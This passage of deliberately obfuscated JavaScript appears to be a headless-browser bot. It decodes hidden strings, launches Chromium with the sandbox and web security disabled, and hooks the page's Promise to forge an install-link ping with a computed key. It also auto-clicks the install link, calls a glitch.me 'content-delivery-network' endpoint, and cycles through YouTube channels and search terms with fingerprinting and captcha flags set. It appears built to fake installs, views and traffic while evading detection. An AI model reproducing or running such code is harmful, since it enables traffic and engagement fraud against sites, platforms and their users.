              for (J = 0x2424 + 0x5db + -0x29ef; J < 0x143 + 0x1 * 0x18c8 + -0x1 * 0x19bb; ++J)
                K = Q[J - (-0x126f + 0x68e + 0x4 * 0x2f9)] ^ Q[J - (0x105f + 0x1a0b + 0x7 * -0x60e)] ^ Q[J - (0x21f2 + -0x1a2 + -0x2042)] ^ Q[J - (-0x1 * 0x13ac + -0x177 * 0x1 + 0x1533)], Q[J] = K << 0x93b * -0x4 + 0x1c9 * -0xd + 0x3c22 | K >>> -0x1 * 0xfeb + 0x955 + 0x6b5;
              for (J = -0x1 * -0x1c81 + 0x1f4d + 0x1 * -0x3bce; J < -0xa7 * -0x1d + 0x26c4 + -0x399b; J += 0x7be + -0x1 * -0x633 + -0xdec)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xe30 + 0x4 * 0x19f + -0x14a7 * 0x1 | L >>> 0x11 * 0x3b + 0x741 + 0x1 * -0xb11) + (M & N | ~M & O) + P + (0x4 * 0xbf4a8f7 + 0x7ca19c1c + 0x2d * -0x1d22c3b) + Q[J] << -0x13f2 + -0x9a * -0x27 + -0x384) << 0x1c56 + 0x1f6c + 0x1 * -0x3bbd | P >>> 0x65 * -0x33 + -0xdf + 0x1519) + (L & (M = M << -0x190e + -0x1b40 + -0x262 * -0x16 | M >>> -0x1eac + -0x1f67 * -0x1 + 0x1 * -0xb9) | ~L & N) + O + (-0x1 * 0x8a2da933 + 0x6f39ddda + 0x757644f2) + Q[J + (0xbe * 0x1 + -0xb47 + 0xa8a)] << 0x1c34 + -0x1 * -0x4c4 + -0x20f8 * 0x1) << -0x3 * -0x209 + 0x2de * -0xd + 0x1f30 | O >>> -0x21 * -0xe9 + -0x2402 + -0x30a * -0x2) + (P & (L = L << 0x233f * -0x1 + 0x307 * 0x1 + 0x102b * 0x2 | L >>> 0x9f5 + -0x1 * 0x1d87 + 0x7 * 0x2cc) | ~P & M) + N + (0x1 * 0x752cda9b + -0x4e64 * 0xa86d + -0x1771872 * -0x11) + Q[J + (-0x95 * -0x2 + 0xb79 * 0x3 + -0x515 * 0x7)] << -0x4c + -0x5 * -0x659 + -0x1f71) << -0xf68 + -0x18ed + 0x285a | N >>> -0x1 * -0x1f99 + -0x78 * -0x3e + -0x3c8e) + (O & (P = P << -0x2 * -0xd32 + 0x6f * -0x54 + 0xa26 | P >>> 0x3 * -0x142 + 0x2172 + 0xed5 * -0x2) | ~O & L) + M + (-0x55f006 * -0x187 + -0xa6cb41b4 + 0x2a040b61 * 0x3) + Q[J + (0xadb + 0x17ff + 0x1 * -0x22d7)] << 0x79a * 0x1 + -0x2 * -0xb49 + 0x78b * -0x4) << 0x73 + -0xe21 + 0x15 * 0xa7 | M >>> 0x47 * 0x45 + 0x1788 + 0xe3 * -0x30) + (N & (O = O << -0x2256 + -0x3 * 0x878 + 0x3bdc | O >>> 0x1689 + 0x3 * -0x646 + 0x3b5 * -0x1) | ~N & P) + L + (-0x9a63c6f9 + 0x163a03c9 * 0x6 + 0x6f8a29dc) + Q[J + (-0x29 * -0x97 + 0x1fe7 + 0x1 * -0x3812)] << 0x14eb + 0x5 * 0x2b7 + -0x227e, N = N << -0x59 * -0x49 + -0x1eb1 + -0x1 * -0x56e | N >>> 0xc58 + -0x20d9 + 0x1483;
              for (; J < 0x57 * -0x2c + 0x2155 + -0x1239; J += -0xb9 + 0x4a * 0x70 + -0x1fa2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x1b67 + 0x389 * -0xa + 0x7f8 | L >>> -0x1c5c + 0x11b0 + 0xac7) + (M ^ N ^ O) + P + (-0x11c152f2 + -0x9468c92c + 0x1150407bf) + Q[J] << -0x120b + 0x1 * 0x18d1 + -0x6c6) << 0x305 * -0x3 + 0xb * 0x15d + 0x1f9 * -0x3 | P >>> 0xbd7 + 0x1bf + -0xd7b) + (L ^ (M = M << 0x29 * 0xdb + -0x3 * 0x1f5 + -0x6 * 0x4d9 | M >>> 0x89 * -0x13 + -0x10ef + -0xa * -0x2b6) ^ N) + O + (-0x8071c9f2 + -0x25cbe921 * -0x3 + 0x7de7fa30) + Q[J + (-0x515 + 0x1be6 * -0x1 + 0x20fc)] << 0x243c + 0x3 * -0x18 + -0xb1 * 0x34) << -0x5cd + -0x1 * 0x1a95 + 0x2067 * 0x1 | O >>> -0x6b * -0x16 + -0x17f9 + -0x1e * -0x7f) + (P ^ (L = L << -0x2b * 0xe3 + -0x1c04 + 0x4243 * 0x1 | L >>> -0xd65 + -0x10df + -0x19 * -0x136) ^ M) + N + (0x5e * 0x23e2f43 + -0xc56b4482 + 0x616fd589) + Q[J + (0x59a * -0x1 + 0x102f + -0xa93)] << 0x557 + -0x6c4 + 0x16d) << -0x16f6 * -0x1 + 0x439 + -0x1b2a | N >>> -0x14 * -0xc5 + 0xab * -0x5 + -0xbf2) + (O ^ (P = P << -0x6 * -0x503 + 0x614 * 0x4 + 0x4 * -0xd91 | P >>> -0x128b + 0xcb9 * 0x3 + 0x1 * -0x139e) ^ L) + M + (0x2e33836c + 0x79d47a22 * 0x1 + -0x392e11ed) + Q[J + (0x2 * 0xc47 + -0x1 * 0xd9d + -0x577 * 0x2)] << 0x1ce0 + -0x343 * 0x7 + -0x60b) << 0x1783 + -0xfb * -0xa + -0x214c | M >>> 0x473 + 0x1d5 + -0x62d) + (N ^ (O = O << 0x223b * 0x1 + 0x1 * -0x11f4 + 0x24f * -0x7 | O >>> 0x1 * -0x3f3 + 0xf2 * -0xd + 0x1 * 0x103f) ^ P) + L + (-0x931b242f + -0x3476a2e5 + 0x1366bb2b5) + Q[J + (-0x5 * -0x166 + 0x1181 + -0x187b * 0x1)] << 0x1 * -0x1bb + 0x23d9 + 0x18d * -0x16, N = N << -0x1b33 + -0xb7 + 0xc * 0x256 | N >>> -0x111a + 0x3b * 0x3a + 0x3be;
              for (; J < -0xb3 * 0x35 + -0xa1a + 0x2f65; J += -0x2 * -0x121f + -0x166a + -0x2c3 * 0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xd * -0x7f + -0x1 * 0x22 + 0x193 * -0x4 | L >>> 0x1 * -0x40f + -0xe2c + 0x1256) + (M & N | M & O | N & O) + P - (-0x981a9ec8 + 0x7 * 0x1acbb2f5 + 0x4d6cfd39 * 0x1) + Q[J] << 0x899 * -0x2 + 0x19b0 + -0x87e * 0x1) << -0xa91 + -0x14b9 * 0x1 + 0x1f4f | P >>> -0x3a6 + -0x22a2 + 0x2663) + (L & (M = M << -0x1b64 + -0x1 * -0x1faa + -0xe * 0x4c | M >>> 0x3c1 * -0x5 + -0x4ee + 0x3 * 0x7e7) | L & N | M & N) + O - (-0x451811 * 0x2c2 + -0x6d5eb107 + -0x19ccf530d * -0x1) + Q[J + (-0x2197 * 0x1 + 0x11 * -0x14b + 0x3793)] << -0x66d * 0x4 + 0x4 * 0x2b4 + 0xee4) << 0x2 * -0x8ed + -0x1036 + 0x2215 | O >>> 0x4f * 0x55 + 0x2b4 * -0x2 + 0x6e8 * -0x3) + (P & (L = L << 0x23 * 0x2b + -0xa92 + -0x4cf * -0x1 | L >>> -0x26ae * 0x1 + -0x1015 + 0x1 * 0x36c5) | P & M | L & M) + N - (0xcc6fb135 + 0xdbb4e35a * 0x1 + -0x13740516b) + Q[J + (-0x1 * -0xd1 + -0x1d * -0x107 + -0xf4d * 0x2)] << -0x1e * 0x15 + 0x74a + 0x19c * -0x3) << 0x812 * -0x3 + -0xb * 0x1f5 + 0x2dc2 | N >>> -0x241 * -0x1 + -0x143a + 0x485 * 0x4) + (O & (P = P << -0x172 + 0xd * 0xb3 + -0x29 * 0x2f | P >>> 0x814 + -0x923 + -0x111 * -0x1) | O & L | P & L) + M - (0xe05c5cf7 + -0x67367970 + -0x841a063) + Q[J + (-0x5a1 + -0x3 * -0xc77 + -0x1fc1)] << 0x4f0 + -0xbdd + -0x9 * -0xc5) << 0x204b + -0x12ef + 0x5 * -0x2ab | M >>> 0x8 * 0x224 + 0x1cc3 + -0x2dc8) + (N & (O = O << -0x142b * 0x1 + -0x1a70 + 0x2eb9 | O >>> 0x2 * -0xae + 0x1996 + -0x1838) | N & P | O & P) + L - (-0x9f907728 + -0x60e1a42b * -0x1 + 0xaf931621) + Q[J + (0x23a7 + 0x1039 + 0xcf7 * -0x4)] << 0x2 * -0x31b + -0x1e6a + 0x20 * 0x125, N = N << -0xcb9 + 0x12 * -0xeb + 0x1d5d | N >>> -0x2a5 * 0xa + 0xa35 + 0x103f * 0x1;
              for (; J < 0x96f + 0x1de9 + -0x2708; J += -0x4 * 0x5c1 + 0x561 + 0x2 * 0x8d4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x2146 + -0x1 * 0x545 + -0x269 * -0x10 | L >>> -0xa6d + 0x1c3 + -0x1 * -0x8c5) + (M ^ N ^ O) + P - (-0x42fa65c6 + -0x51ff4e15 + -0x1 * -0xca96f205) + Q[J] << -0xb * 0x199 + -0x5 * 0x657 + 0x3146) << 0x1de1 + -0x1e16 + 0x3a | P >>> -0x96d + 0x13 * -0xb9 + 0x1743) + (L ^ (M = M << 0x1bfd + 0x886 * -0x3 + 0x24d * -0x1 | M >>> 0x4 * 0x5ba + 0x417 * -0x3 + -0xaa1) ^ N) + O - (0x59ef972 + -0x30648773 + 0x6062cc2b) + Q[J + (0x721 + 0xf52 + -0x22 * 0xa9)] << -0x14ba + 0xc4e + 0x86c) << 0x592 + -0x1 * -0x1ea2 + -0x3b * 0x9d | O >>> 0xb9a + -0x1318 + 0x5 * 0x185) + (P ^ (L = L << -0x1d3e + 0x267d + -0x30b * 0x3 | L >>> -0x89b * 0x1 + 0x185c + -0xfbf * 0x1) ^ M) + N - (0x6182b2f7 + -0x6973eb60 + 0x3 * 0x1484d231) + Q[J + (0x156f + 0x16da + 0x5 * -0x8db)] << 0x1f * 0xb1 + 0x1d80 + -0x11 * 0x2ff) << 0x11f7 + 0x25f1 + 0xfb * -0x39 | N >>> -0x752 + 0x7f * -0x45 + 0x29a8) + (O ^ (P = P << 0x20d * -0x5 + 0x1b13 * 0x1 + -0x4 * 0x42d | P >>> 0x53c * -0x1 + -0x2f * 0x7 + 0x687) ^ L) + M - (0x455c4523 + -0x2c61fbde + -0x99 * -0x2fea2d) + Q[J + (0x2537 + 0x1 * -0x135d + 0x1 * -0x11d7)] << -0x1 * 0x11c0 + 0xe24 + 0x3 * 0x134) << 0x211e + 0x2cd * 0xb + -0x3fe8 | M >>> -0xd * 0x217 + -0x107f * -0x1 + 0xac7) + (N ^ (O = O << -0x2696 + 0x2 * -0x606 + 0x8 * 0x658 | O >>> -0x98e * 0x3 + -0x122 * -0x22 + -0x9 * 0x118) ^ P) + L - (-0xb753ec * -0x89 + -0x5d702a78 + 0x30f17f56) + Q[J + (-0x1e57 + -0x13fe + 0x3259)] << -0xeb7 * 0x1 + 0x1 * 0xbbd + 0x2fa, N = N << 0x59 * 0x61 + 0xc * -0xce + 0x17f3 * -0x1 | N >>> 0x262a + -0x1119 * 0x1 + -0x150f;
              this['h0'] = this['h0'] + L << -0x4 * -0x1f5 + -0x4c * 0x4 + -0x6a4, this['h1'] = this['h1'] + M << 0x1 * 0x172d + 0xad3 + -0x2200, this['h2'] = this['h2'] + N << -0x228a + 0x2129 + 0x161 * 0x1, this['h3'] = this['h3'] + O << 0x25ad + 0x1780 + -0x1 * 0x3d2d, this['h4'] = this['h4'] + P << 0x1 * -0x1aff + 0x2268 + 0x7 * -0x10f;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1ae6 + -0x1867 * 0x1 + 0x1123 * 0x3 & 0x1f83 + 0xc22 + 0x7 * -0x63a] + w[J >> 0x1381 + 0x1 * -0x1f9 + -0x1170 & 0x1aa3 + 0x2 * 0xf30 + -0x38f4] + w[J >> -0xaca * 0x1 + 0x2 * -0x4c7 + 0x146c & -0x1 * 0x1b23 + 0x11a0 + 0x992] + w[J >> -0x1b7 * -0x12 + 0x1ef0 + 0x1 * -0x3dbe & -0x1d36 + -0x82 + -0x7 * -0x441] + w[J >> -0x128f * -0x1 + -0x2622 + 0x139f * 0x1 & 0xa48 + 0x1d64 + 0x1 * -0x279d] + w[J >> 0x10ac + -0x639 + -0x17d * 0x7 & -0x5a9 + -0x518 + 0xad0] + w[J >> 0xb45 + 0x1000 + -0x1b41 * 0x1 & -0x27f * 0xd + -0x1ce6 + 0x3d68] + w[0x25d0 + 0x1 * -0x16e5 + 0x4 * -0x3b7 & J] + w[K >> 0xff9 + 0x1163 * -0x1 + 0x2 * 0xc3 & -0x22f6 + 0x1 * -0x222c + -0x1 * -0x4531] + w[K >> 0x7bd + 0x3 * -0x7cd + 0xfc2 & -0x213b + -0x10ea * 0x1 + 0x3234] + w[K >> -0x1d * -0xdb + -0x26ba * -0x1 + -0x3f75 & 0x62 + -0x5f0 + 0x59d] + w[K >> -0x86 * 0x7 + 0x1 * 0x75e + 0x1d2 * -0x2 & 0x13c8 + 0xa * -0x34c + -0xd3f * -0x1] + w[K >> 0x268f + -0x20 * 0x106 + -0x1 * 0x5c3 & 0x71d * 0x1 + 0x267c + -0x6 * 0x797] + w[K >> -0x2 * -0x56 + 0x102 + 0xd3 * -0x2 & 0x16a1 + -0xb45 + 0x107 * -0xb] + w[K >> 0x1178 + -0xa9f + -0x3 * 0x247 & 0x2193 + 0x7 * -0x399 + -0x855] + w[-0xb13 * -0x1 + 0x7b * 0x2d + -0x20a3 & K] + w[L >> -0x33 * 0xaa + -0x602 + 0x9ff * 0x4 & 0x1691 + -0xe0 + -0xd * 0x1aa] + w[L >> 0x2c * -0x66 + 0x444 + -0x2 * -0x6ae & 0x13b3 + 0x119 * -0x22 + 0x1 * 0x11ae] + w[L >> -0xbca + 0x1503 * -0x1 + 0x13 * 0x1bb & 0x8f7 + 0x11e * 0x3 + -0xc42 * 0x1] + w[L >> 0xaae + -0x13cb * -0x1 + -0x1e69 & 0x2 * -0x337 + 0x23d * 0xc + 0x2e9 * -0x7] + w[L >> -0x1118 + 0x1a88 + -0x964 & 0xfe1 + 0xdd * -0x1a + -0x20 * -0x35] + w[L >> -0xa68 + -0x9f3 * 0x1 + 0x133 * 0x11 & 0x426 + -0x1e2 * -0x3 + -0x9bd] + w[L >> 0x1 * 0x1efe + -0x2197 * -0x1 + -0x4091 & 0x1bc1 + -0x2 * -0x506 + -0x25be] + w[0x1 * -0x23bf + 0x7 * 0xa7 + 0xb * 0x2d7 & L] + w[M >> 0x1076 + 0x3 * 0x246 + 0x5cb * -0x4 & 0x1adf + 0x3 * -0x49a + -0xa * 0x14d] + w[M >> -0x10e2 * -0x2 + -0x659 * -0x4 + -0x3b10 & -0x251b + -0x98a * 0x3 + -0x5 * -0xd28] + w[M >> 0x1d14 + -0x6 * -0x453 + -0xd * 0x43a & -0x1 * -0x20a7 + 0xdea + -0x2e82] + w[M >> -0x2227 * 0x1 + -0x7 * -0x439 + 0x4a8 * 0x1 & 0x513 + -0x1be2 + 0x16de] + w[M >> -0x14 * 0x57 + 0xfe7 * 0x1 + -0x3 * 0x305 & 0x1 * -0xbb6 + 0x139 * -0x1f + 0x2c * 0x121] + w[M >> 0x1615 + -0x163d * 0x1 + 0x30 & -0x264 + 0x1d55 * -0x1 + 0x1fc8] + w[M >> 0x6 * -0x45f + -0xda * -0x24 + -0x71 * 0xa & 0x1b15 + 0x5f1 + -0x20f7] + w[-0x2b * -0xc5 + 0x3d * -0x10 + -0x37 * 0x88 & M] + w[N >> -0x3fd * -0x6 + 0x1c74 + -0x3446 & -0x253c + 0x1 * 0x263b + -0xf0] + w[N >> 0x1 * 0x16bb + 0x11 * -0x29 + -0x2 * 0x9f5 & -0x1 * -0x2315 + -0x20ff + 0x207 * -0x1] + w[N >> -0x1541 + 0x101f * -0x1 + 0x2574 & 0x247b * 0x1 + 0xf * 0x33 + -0x2769] + w[N >> 0x823 * -0x2 + 0x1a15 + 0x9bf * -0x1 & -0x1 * 0x2064 + 0x272 + 0x1e01] + w[N >> 0x1fbc + -0x1a88 + -0x528 & -0x1 * 0x989 + -0xf * -0x163 + -0x1 * 0xb35] + w[N >> -0x7 * 0x119 + -0x1 * 0x1c03 + -0x11 * -0x21a & -0x2 * -0x7e1 + -0x2 * -0x632 + -0x95d * 0x3] + w[N >> -0x202f + -0x5 * -0x3b2 + 0xdb9 & 0x1811 + -0x9c4 + -0xe3e] + w[0x24b2 + -0x2491 + -0x12 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x2672 + 0x1780 + -0x8d6 * 0x7 & -0x2 * 0x111d + -0x31 * 0x81 + -0x1 * -0x3bea,
                J >> 0x2 * 0x9f3 + 0x40 * 0x25 + -0x1d16 & 0x15e8 + 0x600 + 0x1 * -0x1ae9,
                J >> 0x945 * 0x1 + -0x6d * 0xd + 0x3 * -0x13c & 0x17ac + 0x149d * 0x1 + 0x15a5 * -0x2,
                0x1 * 0x407 + -0x4 * -0x295 + 0x474 * -0x3 & J,
                K >> -0xab5 + 0x185a * 0x1 + -0xd8d & -0x4e0 + 0x3 * -0x4ef + -0x93 * -0x24,
                K >> -0x17da + -0x84e + 0x2 * 0x101c & -0x1a * 0x9e + 0xa34 + 0x6d7,
                K >> 0x139 + 0x5ae * 0x4 + -0x17e9 & 0x3 + -0xc5b + 0xd57,
                -0xc9 * 0x22 + 0x17f4 + 0x3bd & K,
                L >> -0xd9c + -0x5bf + 0x1373 & -0x101f + -0x2 * -0x629 + -0x1 * -0x4cc,
                L >> 0x43 * 0x3d + 0x173 + 0x2 * -0x8ad & -0x1d94 + -0xf23 + 0x2db6,
                L >> 0x24eb + -0x12b6 * 0x2 + 0x89 & -0x814 + 0x1b1e + -0x120b,
                0x57 * 0x2d + -0x197 + -0xcb5 * 0x1 & L,
                M >> -0xfb7 * 0x2 + 0xfe6 + 0xfa0 & 0xb3d * -0x3 + -0x66f * -0x2 + -0x15d8 * -0x1,
                M >> 0x13 * 0xce + -0x17ff + 0x5 * 0x1c1 & -0xd * -0x15 + -0xd24 + -0x2 * -0x689,
                M >> -0x1c95 + 0x9a7 + 0x12f6 & 0x815 + -0x2 * -0xdd7 + -0x19 * 0x164,
                -0x21a3 + -0x1 * -0x79c + 0x1b06 & M,
                N >> -0x1096 + 0x21b9 + -0x1 * 0x110b & 0x11 * 0x107 + 0x1818 * -0x1 + -0x10 * -0x7a,
                N >> 0x2660 + -0x1101 + 0x443 * -0x5 & 0x2 * 0x652 + 0x361 * -0x1 + -0x844,
                N >> -0x1a61 + 0x275 + 0x17f4 & 0xda0 + -0x42f * -0x6 + -0x25bb,
                0x4cf + -0x8f + -0x7 * 0x77 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1005 + 0xcc0 + 0x5 * -0x5bd), (K = new DataView(J))['setUint32'](-0xbee + -0x376 + 0x3d9 * 0x4, this['h0']), K['setUint32'](0x22db + 0xaf6 * -0x1 + -0x17e1, this['h1']), K['setUint32'](-0x4c7 + -0x5 * -0x7a6 + -0x216f * 0x1, this['h2']), K['setUint32'](-0x1b5f + 0x2329 + -0x2 * 0x3df, this['h3']), K['setUint32'](-0x7f * -0x35 + -0x103b + -0x2 * 0x500, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + W(0x11) + 'me']('install-li' + 'nk')[0x44d * 0x9 + -0x2396 + 0x31f * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1 * -0x1bdb + 0x4 * -0x281 + 0x7 * 0x569;
            J[-0xde2 + -0x2 * 0xd + -0x2 * -0x6fe]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x27f + 0x4 * -0x685 + 0x1795 * 0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x243c + -0x95 * 0x22 + -0x1 * -0x3807), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x10a3 + -0xf6 * 0x1 + 0x119a;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1 * 0x1c94 + 0x70 + -0x1728), Promise['resolve'](-0x2 * 0x23f + -0x15a5 + 0x1a24);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x176 * -0x1 + -0x7d9 * 0x1 + 0x94f * 0x1; j < 0xb74 * 0x1 + -0x2df + -0x894; j++)
    i();
}
const NETWORK_PATIENCE = 0x35f * -0x7 + 0x2c7 + 0x3412 + (-0xdf4 + 0x2 * -0x492 + 0x22d * 0x10) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1443 + 0x1 * -0x2e + -0x1dc * -0xb) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x341 * 0x8 + 0x114f + 0x7 * -0x631; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x75a * -0x4 + -0x1345 + 0x30ad);
    let h = e[f];
    if (b['NsQvgZ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x374 + 0x1a0c + 0x80 * -0x3b, s, t, u = 0x197 + 0x58 * 0x4 + -0x2f7; t = n['charAt'](u++); ~t && (s = r % (0x25b0 + -0x2123 + 0x2b * -0x1b) ? s * (-0x9fa + 0x949 + 0xf1) + t : t, r++ % (0x62 * 0x30 + -0x19d7 + 0x77b)) ? p += String['fromCharCode'](-0x3 * -0x626 + 0x237e + 0x1 * -0x34f1 & s >> (-(-0x1bf2 + 0x1353 + 0x1 * 0x8a1) * r & 0xb3c + -0x165 + -0x9d1 * 0x1)) : 0x2c * -0x4c + 0x1 * -0xcbd + -0x19cd * -0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x51 * -0x15 + -0x1 * -0x2302 + -0x29a7, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1fcf + 0x1ad7 + 0x508))['slice'](-(0x11b + 0x2694 + -0x27ad));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x3 * -0xbf + -0x1 * 0xf25 + 0x1162,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1ce2 + 0x1d93 * 0x1 + 0x3 * -0x3b; u < -0x2bf * 0x2 + 0xe67 + -0x7e9; u++) {
          p[u] = u;
        }
        for (u = 0x3dc + -0x7fd + 0x1 * 0x421; u < 0x3 * 0xaa9 + 0x6e5 * -0x1 + 0x1 * -0x1816; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x811 * -0x1 + -0xeb1 + -0x1 * -0x17c2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1240 + 0x1d3 * 0xb + -0x5d * 0x5, q = -0x169c * 0x1 + -0x214c + -0x4 * -0xdfa;
        for (let v = -0x18ab + 0x11 * -0x133 + 0x1687 * 0x2; v < n['length']; v++) {
          u = (u + (0x4 * -0x2c0 + -0x1849 * 0x1 + 0x234a)) % (0x1 * -0x84d + 0xa0f + -0xc2), q = (q + p[u]) % (-0x1e52 + -0x938 + 0x1 * 0x288a), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x7 * -0x6e + 0x1e1 * -0xc + 0x16 * 0xef)]);
        }
        return t;
      };
      b['JFlRhT'] = m, c = arguments, b['NsQvgZ'] = !![];
    }
    const j = e[-0xb4e * 0x1 + 0x22b9 + -0x176b],
      k = f + j,
      l = c[k];
    return !l ? (b['yPQVdi'] === undefined && (b['yPQVdi'] = !![]), h = b['JFlRhT'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x75a * -0x4 + -0x1345 + 0x30ad);
    let h = e[f];
    return h;
  }, d(b, c);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 